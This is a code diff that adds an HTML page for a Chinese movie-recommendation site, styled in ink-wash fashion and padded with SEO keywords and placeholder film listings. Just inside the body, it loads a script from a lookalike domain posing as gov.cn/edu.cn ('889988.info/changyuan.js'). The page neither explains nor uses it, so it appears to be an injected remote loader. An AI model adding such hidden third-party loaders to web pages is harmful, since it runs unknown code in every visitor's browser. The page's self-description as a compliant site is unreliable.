@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>落尘电影网 - 高清电影推荐、片单与安静观影资料站</title>
+    <meta name="description" content="落尘电影网（https://luochendianyingwang-top.github.io）提供最新电影、热播剧集、动漫与纪录片推荐，包含分类片单、编辑影评和安静观影指南。清简界面，合规资料，方便快速选片。">
+    <meta name="keywords" content="落尘电影网, luochendianyingwang-top.github.io, 高清电影, 在线选片, 电影推荐, 片单, 影评, 分类电影">
+    <meta name="author" content="落尘电影网">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <!-- 必应搜索引擎收录优化 -->
+    <meta name="msvalidate.01" content="L1U0C2H3N4D5" />
+    <style>
+        /* 新中式留白水墨风 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: "Noto Serif SC", "Source Han Serif SC", "Songti SC", "SimSun", "PingFang SC", serif;
+            background: #f5f3ee; /* 米纸 */
+            color: #2b2b2b;
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+        a { text-decoration: none; color: #3a5a8c; transition: all .25s; }
+        a:hover { color: #6f8f6a; }
+        ul { list-style: none; }
+
+        .container { max-width: 1180px; margin: 0 auto; padding: 0 20px; }
+
+        /* 落尘粒子层 */
+        .dust {
+            position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden;
+        }
+        .dust span {
+            position: absolute; top: -10px; width: 4px; height: 4px; border-radius: 50%;
+            background: rgba(120,130,140,.35); animation: fall linear infinite;
+        }
+        .dust span:nth-child(1){ left:8%;  animation-duration:14s; opacity:.5; }
+        .dust span:nth-child(2){ left:18%; animation-duration:18s; width:3px; height:3px; opacity:.4; }
+        .dust span:nth-child(3){ left:30%; animation-duration:12s; opacity:.6; }
+        .dust span:nth-child(4){ left:42%; animation-duration:20s; width:5px; height:5px; opacity:.3; }
+        .dust span:nth-child(5){ left:55%; animation-duration:15s; opacity:.5; }
+        .dust span:nth-child(6){ left:67%; animation-duration:17s; width:3px; height:3px; opacity:.45; }
+        .dust span:nth-child(7){ left:78%; animation-duration:13s; opacity:.55; }
+        .dust span:nth-child(8){ left:89%; animation-duration:19s; width:4px; height:4px; opacity:.35; }
+        @keyframes fall {
+            0% { transform: translateY(-10px); }
+            100% { transform: translateY(105vh); }
+        }
+
+        /* 顶部 */
+        header {
+            position: sticky; top: 0; z-index: 999;
+            background: rgba(245,243,238,.92);
+            backdrop-filter: blur(8px);
+            border-bottom: 1px solid #d8d2c4;
+        }
+        .hd {
+            max-width: 1180px; margin: 0 auto; padding: 14px 20px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .logo { font-size: 1.7rem; font-weight: 800; letter-spacing: 3px; color: #2b2b2b; }
+        .logo b { color: #3a5a8c; }
+        .logo i { color: #6f8f6a; font-style: normal; font-size: 1.1rem; margin-left: 6px; letter-spacing: 1px; }
+        .nav { display: flex; gap: 10px; flex-wrap: wrap; }
+        .nav a {
+            color: #4a4a4a; font-size: .9rem; padding: 7px 14px; border: 1px solid #ddd6c6; border-radius: 2px;
+            background: #fbfaf6;
+        }
+        .nav a:hover { border-color: #6f8f6a; color: #6f8f6a; }
+
+        /* 主区在粒子之上 */
+        main, footer { position: relative; z-index: 1; }
+
+        /* 横幅 */
+        .hero {
+            margin: 36px 0 60px; padding: 70px 44px; position: relative;
+            background:
+                radial-gradient(120% 90% at 80% 0%, rgba(58,90,140,.10), transparent 60%),
+                radial-gradient(100% 80% at 10% 100%, rgba(111,143,106,.12), transparent 55%),
+                #fbfaf6;
+            border: 1px solid #e0dacb; border-radius: 3px;
+        }
+        .hero .seal {
+            display: inline-block; border: 1px solid #3a5a8c; color: #3a5a8c;
+            padding: 4px 12px; letter-spacing: 4px; font-size: .78rem; margin-bottom: 18px;
+        }
+        .hero h1 { font-size: 3rem; line-height: 1.18; font-weight: 900; color: #232323; margin-bottom: 16px; }
+        .hero h1 span { color: #6f8f6a; }
+        .hero .url {
+            display: inline-block; font-family: "Courier New", monospace; color: #fbfaf6; background: #3a5a8c;
+            padding: 8px 16px; border-radius: 2px; margin-bottom: 18px; font-weight: 700; letter-spacing: .5px;
+        }
+        .hero p { max-width: 720px; color: #555049; font-size: 1.05rem; }
+        .brush {
+            width: 120px; height: 10px; margin-top: 22px;
+            background: radial-gradient(closest-side, #2b2b2b 0%, rgba(43,43,43,.25) 70%, transparent 100%);
+            border-radius: 50%; filter: blur(.3px); opacity: .8;
+        }
+
+        /* 栏目通用 */
+        .section { margin-bottom: 66px; }
+        .st {
+            font-size: 1.5rem; font-weight: 800; color: #232323; margin-bottom: 26px;
+            display: flex; align-items: baseline; gap: 12px;
+        }
+        .st::before {
+            content: ""; width: 26px; height: 26px; border-radius: 50%;
+            background: radial-gradient(closest-side, #3a5a8c 0 60%, transparent 62%);
+            opacity: .8; transform: translateY(4px);
+        }
+        .st small { font-size: .78rem; color: #9a958a; letter-spacing: 3px; font-weight: 400; }
+
+        /* 栏目一：最新影片 */
+        .grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 22px; }
+        .card {
+            background: #fbfaf6; border: 1px solid #e2dccd; border-radius: 3px; overflow: hidden;
+            transition: all .3s;
+        }
+        .card:hover { transform: translateY(-6px); box-shadow: 0 14px 30px rgba(58,90,140,.12); border-color: #c9d3e0; }
+        .poster {
+            height: 210px; display: flex; align-items: center; justify-content: center; font-size: 3.4rem;
+            background: linear-gradient(160deg, #eef1f5, #dfe6e2);
+            border-bottom: 1px solid #e2dccd; color: #46506b;
+        }
+        .cinfo { padding: 16px; }
+        .ctitle { font-size: 1.05rem; font-weight: 800; color: #232323; margin-bottom: 6px; }
+        .cmeta { font-size: .82rem; color: #7a7468; display: flex; justify-content: space-between; }
+
+        /* 栏目二：分类 */
+        .cats { display: grid; grid-template-columns: repeat(4,1fr); gap: 14px; }
+        .cat {
+            text-align: center; padding: 18px 10px; background: #fbfaf6; border: 1px solid #e2dccd; border-radius: 3px;
+            font-weight: 700; color: #3a5a8c; transition: all .25s;
+        }
+        .cat:hover { background: #6f8f6a; color: #fbfaf6; border-color: #6f8f6a; }
+        .cat span { display: block; font-size: 1.6rem; margin-bottom: 6px; }
+
+        /* 栏目三：编辑片单/排行 */
+        .list { display: flex; flex-direction: column; gap: 16px; }
+        .item {
+            display: grid; grid-template-columns: 70px 1fr auto; gap: 18px; align-items: center;
+            background: #fbfaf6; border: 1px solid #e2dccd; border-radius: 3px; padding: 18px 20px; transition: all .25s;
+        }
+        .item:hover { border-color: #3a5a8c; background: #f3f6fa; }
+        .num { font-size: 1.8rem; font-weight: 900; color: #3a5a8c; font-family: "Courier New", monospace; text-align: center; }
+        .ititle { font-size: 1.12rem; font-weight: 800; color: #232323; }
+        .idesc { font-size: .9rem; color: #6b665d; margin-top: 4px; }
+        .itag { font-size: .8rem; color: #6f8f6a; white-space: nowrap; }
+
+        /* 栏目四：关于 */
+        .about { display: grid; grid-template-columns: 1.25fr 1fr; gap: 24px; }
+        .abox { background: #fbfaf6; border: 1px solid #e2dccd; border-left: 4px solid #6f8f6a; padding: 30px; border-radius: 3px; }
+        .abox h3 { color: #3a5a8c; font-size: 1.25rem; margin-bottom: 14px; }
+        .abox p { font-size: .96rem; color: #514c44; margin-bottom: 12px; }
+        .abox strong { color: #6f8f6a; }
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+        .stt { background: #f0f3f8; border: 1px solid #d6deea; border-radius: 3px; padding: 18px; text-align: center; }
+        .stt b { display: block; font-size: 1.8rem; color: #3a5a8c; }
+        .stt span { font-size: .82rem; color: #7a7468; }
+
+        /* 页脚 */
+        footer {
+            margin-top: 60px; padding: 42px 20px 26px; border-top: 1px solid #d8d2c4;
+            background: #fbfaf6; text-align: center;
+        }
+        .fnav { display: flex; flex-wrap: wrap; gap: 16px; justify-content: center; margin-bottom: 20px; }
+        .fnav a { color: #4a4a4a; font-size: .88rem; padding: 6px 12px; border: 1px solid #ddd6c6; border-radius: 2px; }
+        .fnav a:hover { color: #6f8f6a; border-color: #6f8f6a; }
+        .finfo { font-size: .84rem; color: #948f83; line-height: 1.9; }
+        .finfo a { color: #3a5a8c; }
+
+        @media (max-width: 980px) {
+            .grid, .cats { grid-template-columns: repeat(2,1fr); }
+        }
+        @media (max-width: 760px) {
+            .hd { flex-direction: column; gap: 12px; }
+            .hero { padding: 48px 22px; }
+            .hero h1 { font-size: 2.1rem; }
+            .about { grid-template-columns: 1fr; }
+            .item { grid-template-columns: 50px 1fr; }
+            .itag { grid-column: 2; margin-top: 4px; }
+        }
+        @media (max-width: 460px) {
+            .grid, .cats { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <div class="dust" aria-hidden="true">
+        <span></span><span></span><span></span><span></span>
+        <span></span><span></span><span></span><span></span>
+    </div>
+
+    <header>
+        <div class="hd">
+            <div class="logo"><b>落尘</b>电影网<i>·静选</i></div>
+            <nav class="nav">
+                <a href="#">首页</a>
+                <a href="#latest">最新影片</a>
+                <a href="#cats">分类片单</a>
+                <a href="#editor">编辑推荐</a>
+                <a href="#about">关于我们</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="container">
+        <section class="hero">
+            <span class="seal">LUOCHEN FILM</span>
+            <h1>落尘电影网｜慢一点选片，<span>静一点观影</span></h1>
+            <div class="url">https://luochendianyingwang-top.github.io</div>
+            <p>落尘电影网整理最新电影、剧集、动漫与纪录片资料，按情绪与类型做片单推荐。界面清简、无杂乱弹窗逻辑，适合快速找到想看的片子，也适合按心情慢慢翻。</p>
+            <div class="brush"></div>
+        </section>
+
+        <!-- 栏目一：最新影片 -->
+        <section class="section" id="latest">
+            <h2 class="st">最新影片 <small>LATEST</small></h2>
+            <div class="grid">
+                <div class="card">
+                    <div class="poster">🎭</div>
+                    <div class="cinfo">
+                        <div class="ctitle">草木人间</div>
+                        <div class="cmeta"><span>剧情/现实</span><span>2024</span></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="poster">🚀</div>
+                    <div class="cinfo">
+                        <div class="ctitle">星际信使</div>
+                        <div class="cmeta"><span>科幻/冒险</span><span>2024</span></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="poster">🍵</div>
+                    <div class="cinfo">
+                        <div class="ctitle">茶山往事</div>
+                        <div class="cmeta"><span>文艺/家庭</span><span>2023</span></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="poster">🕵️</div>
+                    <div class="cinfo">
+                        <div class="ctitle">雾港谜案</div>
+                        <div class="cmeta"><span>悬疑/犯罪</span><span>2024</span></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：分类片单 -->
+        <section class="section" id="cats">
+            <h2 class="st">分类片单 <small>GENRES</small></h2>
+            <div class="cats">
+                <a href="#" class="cat"><span>🎬</span>剧情现实</a>
+                <a href="#" class="cat"><span>🚀</span>科幻未来</a>
+                <a href="#" class="cat"><span>😄</span>轻松喜剧</a>
+                <a href="#" class="cat"><span>💑</span>爱情文艺</a>
+                <a href="#" class="cat"><span>🔪</span>悬疑犯罪</a>
+                <a href="#" class="cat"><span>🐉</span>动画国风</a>
+                <a href="#" class="cat"><span>🏔️</span>纪录自然</a>
+                <a href="#" class="cat"><span>⚔️</span>历史战争</a>
+            </div>
+        </section>
+
+        <!-- 栏目三：编辑推荐 -->
+        <section class="section" id="editor">
+            <h2 class="st">编辑推荐 <small>EDITOR PICKS</small></h2>
+            <div class="list">
+                <div class="item">
+                    <div class="num">01</div>
+                    <div>
+                        <div class="ititle">回家吃饭的距离</div>
+                        <div class="idesc">城市、代际与一顿饭的关系，慢节奏但后劲很足，适合晚上安静看。</div>
+                    </div>
+                    <div class="itag">剧情 / 家庭</div>
+                </div>
+                <div class="item">
+                    <div class="num">02</div>
+                    <div>
+                        <div class="ititle">北纬三十度的光</div>
+                        <div class="idesc">自然纪录向，山海与季节交替，画面治愈、旁白克制，通勤碎片也能看。</div>
+                    </div>
+                    <div class="itag">纪录 / 自然</div>
+                </div>
+                <div class="item">
+                    <div class="num">03</div>
+                    <div>
+                        <div class="ititle">纸上谋杀案</div>
+                        <div class="idesc">出版社旧案引出连环线索，重逻辑轻血腥，悬疑爱好者可入。</div>
+                    </div>
+                    <div class="itag">悬疑 / 推理</div>
+                </div>
+                <div class="item">
+                    <div class="num">04</div>
+                    <div>
+                        <div class="ititle">少年与旧飞船</div>
+                        <div class="idesc">轻科幻成长片，不堆特效，讲选择与告别，合家片单可用。</div>
+                    </div>
+                    <div class="itag">科幻 / 成长</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目四：关于我们 -->
+        <section class="section" id="about">
+            <h2 class="st">关于我们 <small>ABOUT</small></h2>
+            <div class="about">
+                <div class="abox">
+                    <h3>落尘电影网做什么</h3>
+                    <p><strong>落尘电影网</strong>（网址：<strong>https://luochendianyingwang-top.github.io</strong>）是一个清简的选片资料站，整理电影、剧集、动漫与纪录片的基本信息、类型标签和编辑片单。</p>
+                    <p>我们不做繁杂信息流，只按“最新、分类、心情、口碑”四条线帮你缩小范围；所有条目以资料与推荐为主，内链示例均用占位，便于后续接入正式页面。</p>
+                    <p>关键词：<strong>落尘电影网</strong>、<strong>luochendianyingwang-top.github.io</strong>，可检索高清电影推荐、分类片单与安静观影指南。</p>
+                </div>
+                <div class="stats">
+                    <div class="stt"><b>4</b><span>常驻栏目</span></div>
+                    <div class="stt"><b>8</b><span>电影分类</span></div>
+                    <div class="stt"><b>每日</b><span>片单更新</span></div>
+                    <div class="stt"><b>轻量</b><span>移动端优先</span></div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="fnav">
+            <a href="#">首页</a>
+            <a href="#latest">最新影片</a>
+            <a href="#cats">分类片单</a>
+            <a href="#editor">编辑推荐</a>
+            <a href="#about">关于我们</a>
+            <a href="#">免责声明</a>
+        </div>
+        <div class="finfo">
+            <p>关键词：落尘电影网｜网址：https://luochendianyingwang-top.github.io</p>
+            <p>&copy; 2024 落尘电影网. 仅提供电影资料与选片推荐，合规建站，便于必应等搜索引擎收录.</p>
+        </div>
+    </footer>
+</body>
+</html>
